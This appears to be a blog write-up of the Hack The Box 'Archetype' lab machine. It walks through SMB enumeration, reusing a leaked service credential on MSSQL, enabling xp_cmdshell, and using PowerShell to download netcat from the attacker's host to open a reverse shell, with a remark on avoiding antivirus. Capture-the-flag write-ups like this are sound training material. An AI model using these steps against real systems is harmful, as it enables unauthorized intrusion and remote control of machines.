---
title: Hack The Box - Archetype Writeup
categories: [CYBERSECURITY, PENTEST]
tags: [HTB, PRIVESC, PASSWORD_CRACKING]
---
 # **Archetype**

![icon](/assets/img/Archetype/icon.png)


## **Enumeration**

Initiate reconnaissance by **nmap** command :

![nmap](/assets/img/Archetype/nmap.png)

Opened port

- 135 msrpc port
- 139 netbios-ssn port
- 445 microsoft-ds port(smb)
- 1433 MSSQL port
- 5985 Window remote management(Winrm) port

We can gather information about files that shared through system via smb service called **smbclient**, in order to that we want to know name of share folders first.
```smbclient -L //ip-address/ ```
![smb](/assets/img/Archetype/smb.png)

There is the only shared folder that we can access without permission is **backups**, get a connection by ```smbclient //ip-address/shared-folder ```.
After the connection had established, I discovered a file called **"prod.dtsConfig"** and download it by **get** command
![prod](/assets/img/Archetype/prod.png)


We obtained credential of user **"sql_svc"** whose password  is**"M3g4c0rp123".  Since **mssqlclient** is not built-in on the Kali machine, we use **impacket-mssqlclient** instead.

to establish a connection use ```impacket-mssql username:password@hostname -windows-auth ``` the reason for -windows-auth is because the username is **"ARCHETYPE\sql_svc"** where ARCHETYPE\ is the domain name. it's not native MSSQL server account. 

![catprod](/assets/img/Archetype/catprod.png)
![mssql](/assets/img/Archetype/mssql.png)


Next, I want to execute OS command. In mssql service we don't have native command shell but we have similar command which is called **"xp_cmdshell"**.

To enable it : ```enable_xp_cmdshell ```,then test with the basic line **xp_cmdshell "whoami"**
![enable](/assets/img/Archetype/enable_xp_cmdshell.png)


## **Exploitation**


Because Windows doesn't support Bash shell, we will use Powershell to download Netcat and execute it on victim's machine to achieve a reverse shell, while avoiding antivirus software. First, we located the file location, then change directory to the exact path which contained the file, mine is nc.exe.

Next, we prepared a Python HTTP server to transfer the file.
![enable](/assets/img/Archetype/python_nc.png)

Now, back to MSSQL terminal. We will invoke Powershell to do two-steps.
First, download the file. Next, execute it and spawn cmd to our Kali machine.
```xp_cmdshell "powershell iwr http://your ip/file -Outfile location ```

![iwrnc](/assets/img/Archetype/iwr_nc.png)

We can confirmed the file was transfer successfully:
![python200nc](/assets/img/Archetype/python_200_nc.png)


Before we continue exploiting, we need to open our listener.
![listener](/assets/img/Archetype/listener.png)


Its high time to spawn a reverse shell using Netcat via MSSQL terminal
by ```xp_cmdshell "powershell <location of the file>  <destination> <port> <action>" ```
![nc](/assets/img/Archetype/nc.png)

![rev](/assets/img/Archetype/rev.png)

